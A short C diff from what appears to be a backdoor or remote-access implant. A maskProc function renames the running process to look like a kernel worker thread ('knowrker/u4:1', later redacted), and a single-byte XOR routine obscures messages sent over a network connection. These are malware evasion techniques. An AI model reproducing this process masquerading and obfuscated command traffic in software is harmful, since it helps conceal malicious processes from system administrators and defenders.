@@ -7,10 +7,10 @@
 
 
 void maskProc(int argc, char *argv[]){
-      prctl(PR_SET_NAME, "knowrker/u4:1", 0,0,0);
+      prctl(PR_SET_NAME, "[******]", 0,0,0);
       
       memset(argv[0], 0, strlen(argv[0]));
-      strcpy(argv[0], "knowrker/u4:1");
+      strcpy(argv[0], "[******]");
       
 
 }
@@ -23,8 +23,9 @@ void safeSend(int connID, char *msg){
       }*/
       send(connID, encryption, strlen(encryption), 0);
 }
-void decrypt(char *input, int len, char key) {
-      for (int i = 0; i < len; i++) {
-          input[i] = input[i] ^ key;
+
+void cipher(char *msg, int msg_len){
+      for(int i=0; i<msg_len; i++){
+            msg[i] = (unsigned char)msg[i]^(unsigned char)CIPHER_KEY;
       }
 }
